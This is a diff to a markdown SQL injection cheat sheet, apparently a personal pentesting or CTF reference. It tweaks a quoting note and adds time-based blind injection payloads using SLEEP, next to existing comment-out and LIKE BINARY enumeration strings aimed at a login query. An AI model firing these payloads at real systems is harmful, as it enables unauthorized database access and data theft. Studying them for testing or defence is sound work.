@@ -1,5 +1,5 @@
 
-###### In the following queries, `'` may not work sometimes, so { `\`\`,`"` } can  be tested
+###### In the following queries, `'` may not work sometimes, so { __\`__,`"` } can  be tested
 ###### To comment out the remaining code, { `;#`,`;--`,`;//` } can be used
 ###### While doing sqli through urls, { `;#`,`;--`,`;//` } need to be encoded specially 
 
@@ -45,7 +45,9 @@ SELECT * FROM users WHERE username='name' and password='pass'
 
   `' WHERE EXISTS(SELECT * FROM table_name WHERE username LIKE BINARY "%a%") --` [To make a case sensitive search, use BINARY right after LIKE]
 
-
+## Time-based Blind SQLI
+* `' OR (SELECT SLEEP(10) FROM table_name WHERE username='something') --`
+* `' OR IF(username='something',SLEEP(10),0) --`
  
 ## Common-errs
 * `mysql` does a case insensitive search by default and also ignores the trailing spaces
